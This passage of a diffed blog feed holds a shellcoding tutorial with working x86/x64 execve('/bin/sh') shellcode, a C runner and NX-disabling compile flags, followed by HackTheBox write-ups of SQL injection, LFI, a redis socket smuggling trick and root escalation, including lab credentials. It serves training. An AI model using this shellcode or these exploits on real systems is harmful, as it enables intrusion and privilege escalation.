+<p>Note that the instructions highlighted in red look weird. These aren’t actual instructions, but rather the bytes we embedded (<code class="language-plaintext highlighter-rouge">/bin/shA</code>) using the <code class="language-plaintext highlighter-rouge">db</code> instruction.</p>
+
+<p>We now need to extract these opcodes. Many ways to go about this, but I personally prefer <code class="language-plaintext highlighter-rouge">objcopy</code> when extracting a whole section;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>objcopy -O binary --only-section=.text test shellcode.bin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20240415185246.png" alt="" /></p>
+
+<p>The file <code class="language-plaintext highlighter-rouge">shellcode.bin</code> contains our raw shellcode. We can use a disassembler to confirm if everything looks good. I use <code class="language-plaintext highlighter-rouge">rasm2</code> (part of <em>Radare2</em>) when dealing with shellcodes;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>rasm2 -d -B -f shellcode.bin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20240415185925.png" alt="" /></p>
+
+<p>Looks good. Now we need check if this shellcode is injectable. We can use a simple C program to test this. First, we need to format this code into a C array. We can achieve this using the <code class="language-plaintext highlighter-rouge">-i</code> option of <code class="language-plaintext highlighter-rouge">xxd</code>;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>xxd -i shellcode.bin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<pre><code class="language-C">unsigned char shellcode_bin[] = {
+  0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
+  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
+  0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
+  0x73, 0x68, 0x41
+};
+</code></pre>
+
+<p>We can now write a simple tester for the above shellcode;</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void main(){
+  unsigned char shellcode_bin[] = {
+    0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
+  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
+    0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
+    0x73, 0x68, 0x41
+  };
+  int (*ret)() = (int(*)())shellcode_bin;
+  ret();
+}
+</code></pre>
+
+<p>Compile the program. Make sure you disable NX (non-executable stack) with <code class="language-plaintext highlighter-rouge">-z execstack</code> flag or the program will segfault;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>gcc tester.c -o tester -m32 -z execstack
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And it worked! We made an x86 injectable shellcode that shows how to use the <code class="language-plaintext highlighter-rouge">JMP + CALL</code> trick to solve addressing issues :)</p>
+
+<p><img src="/assets/img/Pasted image 20240415193413.png" alt="" /></p>
+
+<p>We can also port this shellcode for x64 (64-bit) systems. All we need to do is update the name of the registers, and use the x64 syscall for <code class="language-plaintext highlighter-rouge">execve()</code>.</p>
+
+<p>Under x64, the <code class="language-plaintext highlighter-rouge">syscall</code> instruction is used for making system calls, with the syscall code stored in <code class="language-plaintext highlighter-rouge">RAX</code>. Arguments are passed in registers, staring with <code class="language-plaintext highlighter-rouge">RDI</code>, then <code class="language-plaintext highlighter-rouge">RSI</code>, <code class="language-plaintext highlighter-rouge">RDX</code>, and the rest. To make an <code class="language-plaintext highlighter-rouge">execve()</code> syscall under x64;</p>
+
+<ol>
+  <li>Set <code class="language-plaintext highlighter-rouge">RAX</code> to <code class="language-plaintext highlighter-rouge">0x3b</code></li>
+  <li>Set <code class="language-plaintext highlighter-rouge">RDI</code> to the full path of the program to execute (<code class="language-plaintext highlighter-rouge">/bin/sh</code>)</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">RSI</code> to the <code class="language-plaintext highlighter-rouge">argv[]</code> array.</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">RDX</code> to the <code class="language-plaintext highlighter-rouge">envp[]</code> array. Can be null.</li>
+  <li>Call <code class="language-plaintext highlighter-rouge">syscall</code></li>
+</ol>
+
+<p>The modified shellcode for x64;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
+    <span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">jmp</span> <span class="nv">loc1</span>
+
+<span class="nl">shellcode:</span>
+    <span class="nf">pop</span> <span class="nb">rbx</span>
+    <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>            <span class="c1">; For nulling.</span>
+    <span class="nf">push</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rbx</span><span class="p">]</span>        <span class="c1">; RSP = '/bin/shA'</span>
+    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Null-terminate.</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span>            <span class="c1">; rdi = '/bin/sh'</span>
+    
+    <span class="c1">; Setup argv[]</span>
+    <span class="nf">push</span> <span class="nb">rax</span>
+    <span class="nf">push</span> <span class="nb">rdi</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsp</span>            <span class="c1">; rsi = {"/bin/sh", NULL}</span>
+
+    <span class="c1">; Setup envp[]</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>            <span class="c1">; rdx = NULL</span>
+
+    <span class="c1">; Make the syscall</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3b</span>            <span class="c1">; 0x3b = execve() syscall code</span>
+    <span class="nf">syscall</span>
+
+<span class="nl">loc1:</span>
+    <span class="nf">call</span> <span class="nv">shellcode</span>
+    <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Same steps discussed above can be used to extract and test the shellcode :)</p>]]></content><author><name></name></author><category term="shellcoding" /><category term="shellcoding" /><category term="shellcode" /><category term="binary exploitation" /><category term="linux" /><category term="x86" /><category term="x64" /><category term="assembly" /><category term="asm" /><category term="nasm" /><category term="objdump" /><category term="objcopy" /><category term="radare2" /><category term="rasm2" /><summary type="html"><![CDATA[One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;]]></summary></entry><entry><title type="html">Gofer - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/gofer.html" rel="alternate" type="text/html" title="Gofer - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/gofer</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/gofer.html"><![CDATA[<p><strong>Gofer</strong> is a very nice, <em>hard</em> box on <em>HackTheBox</em>. It starts with a verb tampering attack on a custom proxy to bypass access control, then a phishing attack on a local user using <em>LibreOffice</em> macro. Privesc to root is through a use-after-free (UAF) vulnerability on a custom binary.</p>
 
 <p><br /></p>
 
@@ -2096,632 +2633,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Exploited a runtime library import to gain code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="medium" /><category term="linux" /><category term="web" /><category term="zip" /><category term="file upload" /><category term="zip slip" /><category term="dlopen" /><summary type="html"><![CDATA[Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen().]]></summary></entry><entry><title type="html">PC - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pc.html" rel="alternate" type="text/html" title="PC - HackTheBox" /><published>2023-10-07T00:00:00+01:00</published><updated>2023-10-07T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pc</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pc.html"><![CDATA[<p><strong>PC</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with exploiting an <em>SQL injection</em> vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of <em>PyLoad</em> that has a pre-auth RCE CVE, which will give you access as <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/Pasted image 20230831123309.png" alt="" /></p>
-
-<p><img src="/assets/img/Pasted image 20230831123333.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-<p><br /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Tue Aug 15 23:21:43 2023 as: nmap -sC -sV -p22,50051 -v -Pn -oN nmap.txt 10.10.11.214
-Nmap scan report for 10.10.11.214
-Host is up (0.17s latency).
-
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-50051/tcp open  unknown
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port50051-TCP:V=7.80%I=7%D=8/15%Time=64DBFA80%P=x86_64-pc-linux-gnu%r(N
----[snip]---
-SF:0\0\0\0\0\?\0\0");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Aug 15 23:22:09 2023 -- 1 IP address (1 host up) scanned in 25.77 seconds
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p><br /></p>
-
-<h4 id="port-50051">Port 50051</h4>
-<p><br /></p>
-
-<p>Connecting to this service using <code class="language-plaintext highlighter-rouge">netcat</code> gave a weird response;</p>
-
-<p><img src="/assets/img/Pasted image 20230831123948.png" alt="" /></p>
-
-<p>Googling about this port number and the response found <a href="https://github.com/grpc/grpc-node/issues/1416">something</a>;</p>
-
-<p><img src="/assets/img/Pasted image 20230831124131.png" alt="" /></p>
-
-<p>This identifies the service as <a href="https://grpc.io/"><strong>gRPC</strong></a>;</p>
-<blockquote>
-  <p>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p>
-</blockquote>
-
-<p>Looking for tools to interact with it, I found <a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">this blog post</a>, which did a great job of explaining the protocol. I installed <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a> and connect the web UI to the service;</p>
-
-<p><img src="/assets/img/Pasted image 20230831125146.png" alt="" />
-<img src="/assets/img/Pasted image 20230831125249.png" alt="" /></p>
-
-<p>There is only 1 service and 3 methods defined;</p>
-
-<p><img src="/assets/img/Pasted image 20230831125337.png" alt="" /></p>
-
-<p>I created an account using the <code class="language-plaintext highlighter-rouge">RegisterUser</code> function, and was able to login;</p>
-
-<p><img src="/assets/img/Pasted image 20230831125420.png" alt="" />
-<img src="/assets/img/Pasted image 20230831125524.png" alt="" /></p>
-
-<p>I was issued a token after login;</p>
-
-<p><img src="/assets/img/Pasted image 20230831125622.png" alt="" /></p>
-
-<p>Invoking <code class="language-plaintext highlighter-rouge">getInfo</code> with the token and ID;</p>
-
-<p><img src="/assets/img/Pasted image 20230831125930.png" alt="" /></p>
-
-<p>This is the requested generated;</p>
-
-<p><img src="/assets/img/Pasted image 20230831130828.png" alt="" /></p>
-
-<p>Playing with the request, I got an error message after adding a single quote to the <code class="language-plaintext highlighter-rouge">id</code> parameter;</p>
-
-<p><img src="/assets/img/Pasted image 20230831131016.png" alt="" /></p>
-
-<p>Giving it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, it flagged it as vulnerable, and was able to dump the database;</p>
-
-<p><img src="/assets/img/Pasted image 20230831131613.png" alt="" />
-<img src="/assets/img/Pasted image 20230831131656.png" alt="" /></p>
-
-<p>I was able to SSH into the box using <code class="language-plaintext highlighter-rouge">sau:HereIsYourPassWord1431</code>;</p>
-
-<p><img src="/assets/img/Pasted image 20230831131741.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p><code class="language-plaintext highlighter-rouge">sau</code> does not have sudo perms, and is not in any group. There is some service running locally on port <strong>8000</strong>;</p>
-
-<p><img src="/assets/img/Pasted image 20230831132016.png" alt="" /></p>
-
-<p>I setup an SSH tunnel to it and scanned it with NMAP;</p>
-
-<p><img src="/assets/img/Pasted image 20230831132240.png" alt="" /></p>
-
-<p>Loading up the page;</p>
-
-<p><img src="/assets/img/Pasted image 20230831132332.png" alt="" /></p>
-
-<p>Trying the creds of <code class="language-plaintext highlighter-rouge">sau</code> didn’t work. <code class="language-plaintext highlighter-rouge">searchsploit</code> showed it has a pre-auth RCE;</p>
-
-<p><img src="/assets/img/Pasted image 20230831132537.png" alt="" /></p>
-
-<p>Using the exploit, I got a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>
-
-<p><img src="/assets/img/Pasted image 20230831132941.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>NMAP discovered port <strong>22</strong>, and <strong>50051</strong> (gRPC)</li>
-  <li>Used <code class="language-plaintext highlighter-rouge">grpcurl</code> to interact with the service;
-    <ul>
-      <li><code class="language-plaintext highlighter-rouge">getInfo</code> method vulnerable to SQL injection.</li>
-      <li>Used it to leak some creds from the DB, which gave me SSH access as <code class="language-plaintext highlighter-rouge">sau</code></li>
-    </ul>
-  </li>
-  <li>Inside the box as <code class="language-plaintext highlighter-rouge">sau</code>;
-    <ul>
-      <li>Setup a tunnel to local <code class="language-plaintext highlighter-rouge">PyLoad</code> instance</li>
-      <li>Exploit pre-auth RCE to gain a shell as <code class="language-plaintext highlighter-rouge">root</code></li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="easy" /><category term="linux" /><category term="RPC" /><category term="gRPC" /><category term="grpcurl" /><category term="grpcui" /><category term="sql injection" /><category term="pyload" /><summary type="html"><![CDATA[PC is an easy linux machine on HackTheBox. It starts with exploiting an SQL injection vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of PyLoad that has a pre-auth RCE CVE, which will give you access as root.]]></summary></entry><entry><title type="html">Format - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/format.html" rel="alternate" type="text/html" title="Format - HackTheBox" /><published>2023-09-30T00:00:00+01:00</published><updated>2023-09-30T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/format</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/format.html"><![CDATA[<p><strong>Format</strong> is a nice <em>medium</em> linux machine on <em>HackTheBox</em>. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public <em>Gitea</em> repo. Once inside, you’ll be recovering some creds from the backend redis server, and exploiting a <em>format string</em> vulnerability in a python program to gain <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p><br /></p>
-
-<h3 id="format">Format</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/Pasted image 20230901194402.png" alt="" /></p>
-
-<p><img src="/assets/img/Pasted image 20230901194425.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-<p><br /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 23 11:38:22 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.213
-Nmap scan report for 10.10.11.213
-Host is up (0.50s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
-80/tcp   open  http    nginx 1.18.0
-| http-methods: 
-|_  Supported Methods: GET HEAD
-|_http-server-header: nginx/1.18.0
-|_http-title: Site doesn't have a title (text/html).
-3000/tcp open  http    nginx 1.18.0
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: nginx/1.18.0
-|_http-title: Did not follow redirect to http://microblog.htb:3000/
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Aug 23 11:39:36 2023 -- 1 IP address (1 host up) scanned in 73.75 seconds
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-<p><br />
-A very neat looking web app for bloggers;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195129.png" alt="" /></p>
-
-<p>Was able to register an account and login;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195253.png" alt="" /></p>
-
-<p>Created a blog named <code class="language-plaintext highlighter-rouge">testing</code>, which interestingly spawned a new subdomain on the site;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195323.png" alt="" />
-<img src="/assets/img/Pasted image 20230901195414.png" alt="" /></p>
-
-<p>Going to the <code class="language-plaintext highlighter-rouge">edit</code> link, we were given options to add contents to the blog;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195530.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="gitea">Gitea</h4>
-<p><br /></p>
-
-<p>Port <code class="language-plaintext highlighter-rouge">3000</code> is running <em>Gitea</em>, and one public repo was found;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195745.png" alt="" /></p>
-
-<p>This seems to contain the source code of the blogging web app, so I downloaded it for analysis;</p>
-
-<p><img src="/assets/img/Pasted image 20230901195842.png" alt="" /></p>
-
-<p>Nothing special was found when going through previous commits. Going through the source code, the code used to register a user account showed the application using a <em>redis</em> server as backend database via a unix socket file, and there is a user setting named <code class="language-plaintext highlighter-rouge">pro</code>, which is set to <code class="language-plaintext highlighter-rouge">false</code> by default;</p>
-
-<p><img src="/assets/img/Pasted image 20230901200530.png" alt="" /></p>
-
-<p>The code for creating blogs showed they are stored in <code class="language-plaintext highlighter-rouge">/var/www/microblog/</code> + the name of the blog (which is strictly lowercase alphabets, so no room for code injection);</p>
-
-<p><img src="/assets/img/Pasted image 20230901201103.png" alt="" /></p>
-
-<p>No part of the code made any changes to <em>Nginx</em> config, so I am guessing it is somehow configured to serve all directories in that location as subdomains.</p>
-
-<p>Going through the code used to add contents to the blog in the edits page, it is vulnerable to <em>arbitrary write</em> as no attempt was made to validate the value of the POST parameter <code class="language-plaintext highlighter-rouge">id</code> before it was opened as a file for writing;</p>
-
-<p><img src="/assets/img/Pasted image 20230901201553.png" alt="" /></p>
-
-<p>I tried to exploit this and write to the PHP files, but it didn’t work. This is because when creating a new blog, the template files were first made non-writable before being copied to their web directory using <code class="language-plaintext highlighter-rouge">cp -rp</code>, where the <code class="language-plaintext highlighter-rouge">p</code> preserves the permissions.</p>
-
-<p>Notice the application is storing the <code class="language-plaintext highlighter-rouge">id</code> to a file named <code class="language-plaintext highlighter-rouge">order.txt</code>. This is the same file used by the application when building the page;</p>
-
-<p><img src="/assets/img/Pasted image 20230901202619.png" alt="" /></p>
-
-<p>This gives us an LFI vulnerability because even if we attempt to write to a file we can’t write to, the code won’t error out, and the filename will be stored in <code class="language-plaintext highlighter-rouge">order.txt</code>, which will be loaded when building the page. Testing this by setting <code class="language-plaintext highlighter-rouge">id</code> to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> during edit, it worked;</p>
-
-<p><img src="/assets/img/Pasted image 20230901202941.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="foothold">Foothold</h3>
-<p><br /></p>
-
-<p>With the LFI established, I am interested in how <em>Nginx</em> is configured in this box. Dumping the default config showed something interesting;</p>
-
-<p><img src="/assets/img/Pasted image 20230901203912.png" alt="" /></p>
-
-<p>Notice how the config uses parts of requested URL when routing using <code class="language-plaintext highlighter-rouge">proxy_pass</code>. For a request like <code class="language-plaintext highlighter-rouge">/static/dom/path</code>, this will resolve to <code class="language-plaintext highlighter-rouge">http://dom.microbucket.htb/path</code>.</p>
-
-<p>We know the application is communicating with redis through a unix socket file, and that the data of each user is stored with the user’s username as key in the redis server;</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre><span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
-<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
-<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
-<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
-<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The <code class="language-plaintext highlighter-rouge">proxy_pass</code> command of Nginx can communicate with unix socket files using the <code class="language-plaintext highlighter-rouge">unix</code> protocol. Testing this, I was able to update my user <code class="language-plaintext highlighter-rouge">testuser</code> to <code class="language-plaintext highlighter-rouge">pro</code> by requesting the path <code class="language-plaintext highlighter-rouge">unix:/var/run/redis/redis.sock:testuser pro true /path</code>, which expands to <code class="language-plaintext highlighter-rouge">http://unix:/var/run/redis/redis.sock:testuser pro true .microbucket.htb/path</code>. Since we are still using the HTTP protocol, the request method, followed with everything after <code class="language-plaintext highlighter-rouge">redis.sock:</code> are writting to the socket;</p>
-
-<p><img src="/assets/img/Pasted image 20230901210659.png" alt="" /></p>
-
-<p>The above request sent <code class="language-plaintext highlighter-rouge">HSET testuser pro true</code> to our redis socket, likely with other inputs too which will simply be treated as invalid commands and ignored. This gave us <em>pro</em> access to the application;</p>
-
-<p><img src="/assets/img/Pasted image 20230901210922.png" alt="" /></p>
-
-<p>I now have access to the image upload feature, which creates a new <code class="language-plaintext highlighter-rouge">upload/</code> directory in the blog;</p>
-
-<p><img src="/assets/img/Pasted image 20230901211714.png" alt="" /></p>
-
-<p><img src="/assets/img/Pasted image 20230901211728.png" alt="" /></p>
-
-<p>The following code showed the <code class="language-plaintext highlighter-rouge">upload</code> directory is made writable when we have pro permissions;</p>
-
-<p><img src="/assets/img/Pasted image 20230901212057.png" alt="" /></p>
-
-<p>This means we could use the arbitrary write vulnerability discovered earlier to write PHP files into this directory. Testing this, I was able to gain code execution and a shell on the box;</p>
-
-<p><img src="/assets/img/Pasted image 20230901212411.png" alt="" />
-<img src="/assets/img/Pasted image 20230901212437.png" alt="" />
-<img src="/assets/img/Pasted image 20230901212504.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<p>The box has <code class="language-plaintext highlighter-rouge">redis-cli</code> installed, so I used it to explore the redis server. I got a password;</p>
-
-<p><img src="/assets/img/Pasted image 20230901212848.png" alt="" /></p>
-
-<p>There is a local user named <code class="language-plaintext highlighter-rouge">cooper</code> on the box, so I tried login into his account, and it worked;</p>
-
-<p><img src="/assets/img/Pasted image 20230901212949.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p><code class="language-plaintext highlighter-rouge">cooper</code> is not part of any special group, but he does have a sudo permission on a custom python script;</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre>cooper@format:~$ sudo -l
-Matching Defaults entries for cooper on format:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User cooper may run the following commands on format:
-    (root) /usr/bin/license
-cooper@format:~$ file /usr/bin/license 
-/usr/bin/license: Python script, ASCII text executable
-cooper@format:~$ ~
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
-81
-82
-83
-84
-85
-86
-87
-88
-89
-90
-91
-92
-93
-94
-95
-96
-97
-</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
-</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
-<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
-<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
-<span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
-<span class="kn">import</span> <span class="nn">random</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
